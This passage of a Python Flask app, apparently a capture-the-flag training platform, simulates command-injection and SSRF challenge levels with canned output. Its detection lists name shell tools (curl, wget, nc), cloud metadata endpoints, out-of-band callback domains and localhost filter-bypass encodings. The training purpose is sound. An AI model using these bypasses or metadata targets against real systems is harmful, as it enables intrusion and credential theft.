        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level16.html', flag=flag, cmdi_detected=cmdi_detected,
                          automation_script=automation_script, script_params=script_params,
                          execution_result=execution_result, challenge=challenge)

# Command Injection Level 17 - Command Injection in Container Environments
@app.route('/cmdi/level17', methods=['GET', 'POST'])
def cmdi_level17():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    container_image = request.form.get('container_image', 'nginx:latest')
    container_cmd = request.form.get('container_cmd', '/bin/sh -c "nginx -g \'daemon off;\'"')
    docker_result = ''

    if request.method == 'POST':
        # Simulate a Kubernetes/Docker container management platform
        if container_image and container_cmd:
            # Check for container escape and command injection
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\', '..', '/proc', '/sys']

            for pattern in cmdi_patterns:
                if pattern in container_image or pattern in container_cmd:
                    cmdi_detected = True
                    docker_result = f"Creating container from image: {container_image.split()[0]}\n"
                    docker_result += f"Container command: {container_cmd.split()[0]}\n"
                    docker_result += "Container ID: c4f3d2a1b5e6\n"
                    docker_result += "Container started successfully\n"
                    docker_result += "Monitoring container health...\n\n"

                    # Add container escape output
                    if 'proc' in container_cmd or 'sys' in container_cmd:
                        docker_result += "Container escape detected:\n"
                        docker_result += "Host filesystem access gained\n"
                        docker_result += "Host kernel: Linux docker-host 5.15.0\n"
                    elif 'whoami' in container_cmd:
                        docker_result += "Container execution output:\n"
                        docker_result += "Container user: root\n"
                        docker_result += "Container ID: c4f3d2a1b5e6\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection in Container Environments").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                docker_result = f"Creating container from image: {container_image}\n"
                docker_result += f"Container command: {container_cmd}\n"
                docker_result += "Container started successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection in Container Environments").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level17.html', flag=flag, cmdi_detected=cmdi_detected,
                          container_image=container_image, container_cmd=container_cmd,
                          docker_result=docker_result, challenge=challenge)

# Command Injection Level 18 - Command Injection via Template Engines
@app.route('/cmdi/level18', methods=['GET', 'POST'])
def cmdi_level18():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    report_template = request.form.get('report_template', 'Report for {{customer_name}} generated on {{date}}')
    template_data = request.form.get('template_data', '{"customer_name": "Acme Corp", "date": "2024-12-19"}')
    report_result = ''

    if request.method == 'POST':
        # Simulate a report generation system with template injection
        if report_template and template_data:
            try:
                data = json.loads(template_data)

                # Check for template injection leading to command execution
                ssti_patterns = ['{{', '}}', '{%', '%}', '__', 'import', 'os', 'subprocess']
                cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')']

                template_vulnerable = any(pattern in report_template for pattern in ssti_patterns)
                data_vulnerable = any(any(pattern in str(value) for pattern in cmdi_patterns)
                                    for value in data.values() if isinstance(value, str))

                if template_vulnerable or data_vulnerable:
                    cmdi_detected = True
                    report_result = "Generating report from template...\n"
                    report_result += "Template engine: Jinja2\n"
                    report_result += "Processing template variables...\n"
                    report_result += "Rendering report...\n\n"

                    # Add template injection output
                    if '__import__' in report_template or 'os' in report_template:
                        report_result += "Template injection executed:\n"
                        report_result += "System access gained through template engine\n"
                        report_result += "Current working directory: /app/reports\n"
                    elif any('whoami' in str(value) for value in data.values()):
                        report_result += "Command injection in template data:\n"
                        report_result += "Template user: report-generator\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection via Template Engines").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                else:
                    # Safe template rendering
                    safe_template = report_template.replace('{{customer_name}}', data.get('customer_name', 'Unknown'))
                    safe_template = safe_template.replace('{{date}}', data.get('date', 'Unknown'))
                    report_result = f"Report generated successfully:\n\n{safe_template}\n"

            except json.JSONDecodeError:
                report_result = "Error: Invalid JSON data format"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection via Template Engines").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level18.html', flag=flag, cmdi_detected=cmdi_detected,
                          report_template=report_template, template_data=template_data,
                          report_result=report_result, challenge=challenge)

# Command Injection Level 19 - Command Injection in Message Queues
@app.route('/cmdi/level19', methods=['GET', 'POST'])
def cmdi_level19():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    queue_message = request.form.get('queue_message', '{"task": "process_file", "filename": "data.csv", "options": "--format json"}')
    processing_result = ''

    if request.method == 'POST':
        # Simulate a distributed system with message queue processing
        if queue_message:
            try:
                message = json.loads(queue_message)

                # Check for command injection in message queue processing
                cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

                for key, value in message.items():
                    if isinstance(value, str):
                        for pattern in cmdi_patterns:
                            if pattern in value:
                                cmdi_detected = True
                                processing_result = "Message Queue Processing\n"
                                processing_result += "Queue: task-processor\n"
                                processing_result += f"Task: {message.get('task', 'unknown')}\n"
                                processing_result += "Worker node: worker-03\n"
                                processing_result += "Processing message...\n\n"

                                # Add command injection output
                                if 'uname' in value or 'hostname' in value:
                                    processing_result += "Worker system information:\n"
                                    processing_result += "Worker hostname: task-worker-03\n"
                                    processing_result += "Worker OS: Linux 5.15.0-72-generic\n"

                                # Mark challenge as completed
                                challenge = Challenge.query.filter_by(name="Command Injection in Message Queues").first()
                                if challenge:
                                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                                    if challenge.id not in completed_ids:
                                        update_user_progress(machine_id, challenge.id, challenge.points)
                                break
                        if cmdi_detected:
                            break

                if not cmdi_detected:
                    processing_result = "Message Queue Processing\n"
                    processing_result += f"Task: {message.get('task', 'unknown')}\n"
                    processing_result += "Message processed successfully\n"

            except json.JSONDecodeError:
                processing_result = "Error: Invalid message format"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection in Message Queues").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level19.html', flag=flag, cmdi_detected=cmdi_detected,
                          queue_message=queue_message, processing_result=processing_result, challenge=challenge)

# Command Injection Level 20 - Command Injection with Out-of-Band
@app.route('/cmdi/level20', methods=['GET', 'POST'])
def cmdi_level20():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    system_config = request.form.get('system_config', 'network.interface=eth0')
    webhook_url = request.form.get('webhook_url', 'https://webhook.site/unique-id')
    config_result = ''

    if request.method == 'POST':
        # Simulate an air-gapped industrial control system
        if system_config:
            # Check for out-of-band command injection techniques
            oob_patterns = ['curl', 'wget', 'nc', 'netcat', 'ping', 'nslookup', 'dig']
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\']

            has_oob = any(pattern in system_config for pattern in oob_patterns)
            has_cmdi = any(pattern in system_config for pattern in cmdi_patterns)

            if has_oob and has_cmdi:
                cmdi_detected = True
                config_result = "Industrial Control System Configuration\n"
                config_result += "System: SCADA-HMI-01\n"
                config_result += "Network: Air-gapped environment\n"
                config_result += "Processing configuration...\n"
                config_result += "Applying network settings...\n\n"

                # Add out-of-band output
                if 'curl' in system_config or 'wget' in system_config:
                    config_result += "Out-of-band communication detected:\n"
                    config_result += "External connection established\n"
                    config_result += "Data exfiltration in progress...\n"

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="Command Injection with Out-of-Band").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                config_result = "Industrial Control System Configuration\n"
                config_result += "Configuration applied successfully\n"
                config_result += "System status: Operational\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection with Out-of-Band").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level20.html', flag=flag, cmdi_detected=cmdi_detected,
                          system_config=system_config, webhook_url=webhook_url,
                          config_result=config_result, challenge=challenge)

# Command Injection Level 21 - Command Injection in Cloud Functions
@app.route('/cmdi/level21', methods=['GET', 'POST'])
def cmdi_level21():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    function_code = request.form.get('function_code', 'def handler(event, context):\n    return {"status": "success"}')
    runtime_env = request.form.get('runtime_env', 'python3.9')
    cloud_result = ''

    if request.method == 'POST':
        # Simulate Google Cloud Functions deployment
        if function_code:
            # Check for command injection in cloud function code
            cmdi_patterns = ['os.system', 'subprocess', 'exec', 'eval', '__import__']

            for pattern in cmdi_patterns:
                if pattern in function_code:
                    cmdi_detected = True
                    cloud_result = "Google Cloud Functions Deployment\n"
                    cloud_result += f"Runtime: {runtime_env}\n"
                    cloud_result += "Function: data-processor-v3\n"
                    cloud_result += "Region: us-central1\n"
                    cloud_result += "Deploying function...\n"
                    cloud_result += "Function deployed successfully\n"
                    cloud_result += "Testing function execution...\n\n"

                    # Add cloud function injection output
                    if 'os.system' in function_code or 'subprocess' in function_code:
                        cloud_result += "Function execution output:\n"
                        cloud_result += "Cloud environment: Google Cloud Platform\n"
                        cloud_result += "Service account: cloud-function-sa@project.iam\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection in Cloud Functions").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                cloud_result = "Google Cloud Functions Deployment\n"
                cloud_result += f"Runtime: {runtime_env}\n"
                cloud_result += "Function deployed successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection in Cloud Functions").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level21.html', flag=flag, cmdi_detected=cmdi_detected,
                          function_code=function_code, runtime_env=runtime_env,
                          cloud_result=cloud_result, challenge=challenge)

# Command Injection Level 22 - Command Injection via SSH Commands
@app.route('/cmdi/level22', methods=['GET', 'POST'])
def cmdi_level22():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    ssh_host = request.form.get('ssh_host', 'production-server.company.com')
    ssh_command = request.form.get('ssh_command', 'systemctl status nginx')
    ssh_result = ''

    if request.method == 'POST':
        # Simulate a remote management tool with SSH command execution
        if ssh_host and ssh_command:
            # Check for command injection in SSH commands
            cmdi_patterns = ['&', '|', ';', '`', '$', '(', ')', '\\', '&&', '||']

            for pattern in cmdi_patterns:
                if pattern in ssh_command:
                    cmdi_detected = True
                    ssh_result = f"SSH Connection to {ssh_host.split()[0]}\n"
                    ssh_result += "Authentication: Key-based\n"
                    ssh_result += f"Executing command: {ssh_command.split()[0]}\n"
                    ssh_result += "Connection established...\n"
                    ssh_result += "Command execution started...\n\n"

                    # Add SSH command injection output
                    if 'whoami' in ssh_command or 'id' in ssh_command:
                        ssh_result += "Remote command output:\n"
                        ssh_result += "Remote user: deploy-user\n"
                        ssh_result += "Remote host: production-server-01\n"
                        ssh_result += "SSH session: pts/2\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Command Injection via SSH Commands").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                ssh_result = f"SSH Connection to {ssh_host}\n"
                ssh_result += f"Executing command: {ssh_command}\n"
                ssh_result += "Command executed successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Command Injection via SSH Commands").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level22.html', flag=flag, cmdi_detected=cmdi_detected,
                          ssh_host=ssh_host, ssh_command=ssh_command,
                          ssh_result=ssh_result, challenge=challenge)

# Command Injection Level 23 - Advanced Command Injection Chaining
@app.route('/cmdi/level23', methods=['GET', 'POST'])
def cmdi_level23():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    cmdi_detected = False
    infrastructure_config = request.form.get('infrastructure_config', '{"terraform": {"provider": "aws", "region": "us-east-1"}, "ansible": {"playbook": "deploy.yml", "inventory": "production"}}')
    deployment_result = ''

    if request.method == 'POST':
        # Simulate a complex enterprise infrastructure deployment system
        if infrastructure_config:
            try:
                config = json.loads(infrastructure_config)

                # Check for advanced command injection chaining
                advanced_patterns = ['$(', '`', '&&', '||', '|', ';', '&']
                terraform_cmdi = False
                ansible_cmdi = False

                # Check Terraform config
                if 'terraform' in config:
                    terraform_config = str(config['terraform'])
                    terraform_cmdi = any(pattern in terraform_config for pattern in advanced_patterns)

                # Check Ansible config
                if 'ansible' in config:
                    ansible_config = str(config['ansible'])
                    ansible_cmdi = any(pattern in ansible_config for pattern in advanced_patterns)

                if terraform_cmdi or ansible_cmdi:
                    cmdi_detected = True
                    deployment_result = "Enterprise Infrastructure Deployment\n"
                    deployment_result += "Platform: Multi-cloud hybrid infrastructure\n"
                    deployment_result += "Tools: Terraform + Ansible + Kubernetes\n"
                    deployment_result += "Environment: Production\n"
                    deployment_result += "Initializing deployment pipeline...\n\n"

                    if terraform_cmdi:
                        deployment_result += "Terraform execution:\n"
                        deployment_result += "Provider: AWS\n"
                        deployment_result += "Resources: EC2, RDS, S3\n"
                        deployment_result += "Command injection in Terraform detected!\n\n"

                    if ansible_cmdi:
                        deployment_result += "Ansible execution:\n"
                        deployment_result += "Inventory: Production servers\n"
                        deployment_result += "Playbook: Application deployment\n"
                        deployment_result += "Command injection in Ansible detected!\n\n"

                    deployment_result += "Infrastructure compromise achieved:\n"
                    deployment_result += "Access level: Enterprise administrator\n"
                    deployment_result += "Scope: Multi-cloud infrastructure\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Advanced Command Injection Chaining").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                else:
                    deployment_result = "Enterprise Infrastructure Deployment\n"
                    deployment_result += "Deployment completed successfully\n"
                    deployment_result += "All systems operational\n"

            except json.JSONDecodeError:
                deployment_result = "Error: Invalid infrastructure configuration format"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Advanced Command Injection Chaining").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('cmdi/cmdi_level23.html', flag=flag, cmdi_detected=cmdi_detected,
                          infrastructure_config=infrastructure_config, deployment_result=deployment_result, challenge=challenge)

# SSRF Level 1 - Basic SSRF
@app.route('/ssrf/level1', methods=['GET', 'POST'])
def ssrf_level1():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    url = request.form.get('url', '')
    fetch_result = ''

    if request.method == 'POST':
        # Simulate a URL fetcher with SSRF vulnerability
        if url:
            # Check for SSRF patterns
            ssrf_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1', '10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.']

            for pattern in ssrf_patterns:
                if pattern in url.lower():
                    ssrf_detected = True
                    fetch_result = f"Fetching URL: {url}\n"
                    fetch_result += "Connection established...\n"
                    fetch_result += "Response received:\n\n"

                    # Simulate internal service response
                    if 'localhost' in url.lower() or '127.0.0.1' in url:
                        fetch_result += "HTTP/1.1 200 OK\n"
                        fetch_result += "Server: Apache/2.4.41\n"
                        fetch_result += "Content-Type: text/html\n\n"
                        fetch_result += "<h1>Internal Admin Panel</h1>\n"
                        fetch_result += "<p>Welcome to the internal administration interface</p>\n"
                        fetch_result += "<p>Internal system access successful</p>\n"
                    elif '192.168.' in url or '10.' in url:
                        fetch_result += "HTTP/1.1 200 OK\n"
                        fetch_result += "Server: nginx/1.18.0\n"
                        fetch_result += "Content-Type: application/json\n\n"
                        fetch_result += '{"status": "success", "message": "Internal API accessed", "data": "sensitive_internal_info"}\n'

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Basic SSRF").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                # Normal external URL fetch simulation
                fetch_result = f"Fetching URL: {url}\n"
                fetch_result += "Connection established...\n"
                fetch_result += "Response received:\n\n"
                fetch_result += "HTTP/1.1 200 OK\n"
                fetch_result += "Content-Type: text/html\n\n"
                fetch_result += "<html><body><h1>External Website</h1><p>This is a normal external website.</p></body></html>\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Basic SSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level1.html', flag=flag, ssrf_detected=ssrf_detected,
                          url=url, fetch_result=fetch_result, challenge=challenge)

# SSRF Level 2 - SSRF with Internal Network Scanning
@app.route('/ssrf/level2', methods=['GET', 'POST'])
def ssrf_level2():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    target_url = request.form.get('target_url', '')
    scan_result = ''

    if request.method == 'POST':
        # Simulate a website screenshot service with SSRF vulnerability
        if target_url:
            # Check for internal network scanning
            internal_patterns = ['192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.', 'localhost', '127.0.0.1']

            for pattern in internal_patterns:
                if pattern in target_url.lower():
                    ssrf_detected = True
                    scan_result = f"Taking screenshot of: {target_url}\n"
                    scan_result += "Scanning internal network...\n\n"

                    # Simulate port scanning results
                    if ':22' in target_url:
                        scan_result += "Port 22 (SSH): Open\n"
                        scan_result += "Service: OpenSSH 8.2\n"
                        scan_result += "SSH service detected successfully\n"
                    elif ':80' in target_url or ':8080' in target_url:
                        scan_result += "Port 80/8080 (HTTP): Open\n"
                        scan_result += "Service: Internal Web Server\n"
                        scan_result += "Response: Internal API Documentation\n"
                        scan_result += "Web server access granted\n"
                    elif ':3306' in target_url:
                        scan_result += "Port 3306 (MySQL): Open\n"
                        scan_result += "Service: MySQL Database\n"
                        scan_result += "Database service discovered\n"
                    else:
                        scan_result += "Internal service discovered!\n"
                        scan_result += "Network scan successful\n"
                        scan_result += "Internal network enumeration completed\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="SSRF with Internal Network Scanning").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                # Normal external URL
                scan_result = f"Taking screenshot of: {target_url}\n"
                scan_result += "Screenshot captured successfully\n"
                scan_result += "External website processed\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF with Internal Network Scanning").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level2.html', flag=flag, ssrf_detected=ssrf_detected,
                          target_url=target_url, scan_result=scan_result, challenge=challenge)

# SSRF Level 3 - Cloud Metadata SSRF
@app.route('/ssrf/level3', methods=['GET', 'POST'])
def ssrf_level3():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    webhook_url = request.form.get('webhook_url', '')
    metadata_result = ''

    if request.method == 'POST':
        # Simulate a webhook notification service with SSRF vulnerability
        if webhook_url:
            # Check for cloud metadata endpoints
            metadata_patterns = ['169.254.169.254', 'metadata.google.internal', 'metadata.azure.com', 'metadata.tencentyun.com']

            for pattern in metadata_patterns:
                if pattern in webhook_url.lower():
                    ssrf_detected = True
                    metadata_result = f"Sending webhook to: {webhook_url}\n"
                    metadata_result += "Accessing cloud metadata service...\n\n"

                    if '169.254.169.254' in webhook_url:
                        metadata_result += "AWS EC2 Metadata Service Response:\n"
                        metadata_result += "{\n"
                        metadata_result += '  "instance-id": "i-1234567890abcdef0",\n'
                        metadata_result += '  "instance-type": "t3.medium",\n'
                        metadata_result += '  "security-credentials": {\n'
                        metadata_result += '    "AccessKeyId": "AKIA...",\n'
                        metadata_result += '    "SecretAccessKey": "...",\n'
                        metadata_result += '    "Token": "..."\n'
                        metadata_result += "  }\n"
                        metadata_result += "}\n"
                        metadata_result += "AWS metadata access successful\n"
                    elif 'metadata.google.internal' in webhook_url:
                        metadata_result += "GCP Metadata Service Response:\n"
                        metadata_result += "{\n"
                        metadata_result += '  "project-id": "my-project-123",\n'
                        metadata_result += '  "service-accounts": {\n'
                        metadata_result += '    "default": {\n'
                        metadata_result += '      "token": "ya29.c.Kp6B9n..."\n'
                        metadata_result += "    }\n"
                        metadata_result += "  }\n"
                        metadata_result += "}\n"
                        metadata_result += "GCP metadata access successful\n"
                    elif 'metadata.azure.com' in webhook_url:
                        metadata_result += "Azure Metadata Service Response:\n"
                        metadata_result += "{\n"
                        metadata_result += '  "compute": {\n'
                        metadata_result += '    "vmId": "02aab8a4-74ef-476e-8182-f6d2ba4166a6",\n'
                        metadata_result += '    "subscriptionId": "8d10da13-8125-4ba9-a717-bf7490507b3d"\n'
                        metadata_result += "  },\n"
                        metadata_result += '  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik..."\n'
                        metadata_result += "}\n"
                        metadata_result += "Azure metadata access successful\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Cloud Metadata SSRF").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                # Normal webhook URL
                metadata_result = f"Sending webhook to: {webhook_url}\n"
                metadata_result += "Webhook sent successfully\n"
                metadata_result += "External service notified\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Cloud Metadata SSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level3.html', flag=flag, ssrf_detected=ssrf_detected,
                          webhook_url=webhook_url, metadata_result=metadata_result, challenge=challenge)

# SSRF Level 4 - Blind SSRF with DNS Exfiltration
@app.route('/ssrf/level4', methods=['GET', 'POST'])
def ssrf_level4():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    callback_url = request.form.get('callback_url', '')
    dns_result = ''

    if request.method == 'POST':
        # Simulate a PDF generation service with blind SSRF vulnerability
        if callback_url:
            # Check for DNS exfiltration patterns
            dns_patterns = ['.burpcollaborator.net', '.oastify.com', '.dnslog.cn', '.requestbin.net', '.webhook.site']

            for pattern in dns_patterns:
                if pattern in callback_url.lower():
                    ssrf_detected = True
                    dns_result = f"Generating PDF with callback: {callback_url}\n"
                    dns_result += "PDF generation initiated...\n"
                    dns_result += "Making callback request...\n\n"
                    dns_result += "DNS Query Detected:\n"
                    dns_result += f"Query: {callback_url}\n"
                    dns_result += "Type: A\n"
                    dns_result += "Source: Internal PDF Service\n"
                    dns_result += "Status: DNS exfiltration successful!\n"
                    dns_result += "Blind SSRF exploitation confirmed\n"

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="Blind SSRF with DNS Exfiltration").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break
            else:
                # Normal callback URL
                dns_result = f"Generating PDF with callback: {callback_url}\n"
                dns_result += "PDF generation completed\n"
                dns_result += "No callback made\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Blind SSRF with DNS Exfiltration").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level4.html', flag=flag, ssrf_detected=ssrf_detected,
                          callback_url=callback_url, dns_result=dns_result, challenge=challenge)

# SSRF Level 5 - SSRF with Basic Filters
@app.route('/ssrf/level5', methods=['GET', 'POST'])
def ssrf_level5():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    image_url = request.form.get('image_url', '')
    filter_result = ''

    if request.method == 'POST':
        # Simulate an image proxy service with basic SSRF filters
        if image_url:
            # Basic blacklist filters
            blacklist = ['localhost', '127.0.0.1', '0.0.0.0', '::1']

            # Check if URL bypasses basic filters
            bypass_detected = False

            # Check for various bypass techniques
            if any(blocked in image_url.lower() for blocked in blacklist):
                filter_result = f"Processing image: {image_url}\n"
                filter_result += "ERROR: Blocked by security filter\n"
                filter_result += "Reason: Internal address detected\n"
            else:
                # Check for bypass techniques
                bypass_patterns = ['127.1', '127.0.1', '2130706433', '0x7f000001', '0177.0.0.1', 'localtest.me', '127.0.0.1.nip.io']

                for pattern in bypass_patterns:
                    if pattern in image_url.lower():
                        bypass_detected = True
                        ssrf_detected = True
                        filter_result = f"Processing image: {image_url}\n"
                        filter_result += "Filter bypass detected!\n"
                        filter_result += "Accessing internal service...\n\n"
                        filter_result += "Internal Service Response:\n"
                        filter_result += "HTTP/1.1 200 OK\n"
                        filter_result += "Content-Type: application/json\n\n"
                        filter_result += '{"message": "Internal admin API", "status": "access_granted"}\n'

                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="SSRF with Basic Filters").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                        break

                if not bypass_detected:
                    filter_result = f"Processing image: {image_url}\n"
                    filter_result += "Image downloaded successfully\n"
                    filter_result += "External image processed\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF with Basic Filters").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level5.html', flag=flag, ssrf_detected=ssrf_detected,
                          image_url=image_url, filter_result=filter_result, challenge=challenge)

# SSRF Level 6 - SSRF via File Upload
@app.route('/ssrf/level6', methods=['GET', 'POST'])
def ssrf_level6():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    svg_content = request.form.get('svg_content', '')
    upload_result = ''

    if request.method == 'POST':
        # Simulate an SVG file upload service with SSRF vulnerability
        if svg_content:
            # Check for SVG SSRF patterns
            if '<image' in svg_content and 'href=' in svg_content:
                # Extract href value
                import re
                href_match = re.search(r'href=["\']([^"\']+)["\']', svg_content)
                if href_match:
                    href_url = href_match.group(1)

                    # Check for internal URLs
                    internal_patterns = ['localhost', '127.0.0.1', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.']

                    for pattern in internal_patterns:
                        if pattern in href_url.lower():
                            ssrf_detected = True
                            upload_result = f"Processing SVG file...\n"
                            upload_result += f"Loading image from: {href_url}\n"
                            upload_result += "SVG processing complete\n\n"
                            upload_result += "Internal Service Response:\n"
                            upload_result += "HTTP/1.1 200 OK\n"
                            upload_result += "Content-Type: application/json\n\n"
                            upload_result += '{"message": "Internal file server", "access": "granted"}\n'

                            # Mark challenge as completed
                            challenge = Challenge.query.filter_by(name="SSRF via File Upload").first()
                            if challenge:
                                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                                if challenge.id not in completed_ids:
                                    update_user_progress(machine_id, challenge.id, challenge.points)
                            break
                    else:
                        upload_result = f"Processing SVG file...\n"
                        upload_result += f"Loading image from: {href_url}\n"
                        upload_result += "External image loaded successfully\n"
                else:
                    upload_result = "Processing SVG file...\n"
                    upload_result += "SVG processed successfully\n"
            else:
                upload_result = "Processing SVG file...\n"
                upload_result += "SVG processed successfully\n"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF via File Upload").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level6.html', flag=flag, ssrf_detected=ssrf_detected,
                          svg_content=svg_content, upload_result=upload_result, challenge=challenge)

# SSRF Level 7 - SSRF in Webhooks
@app.route('/ssrf/level7', methods=['GET', 'POST'])
def ssrf_level7():
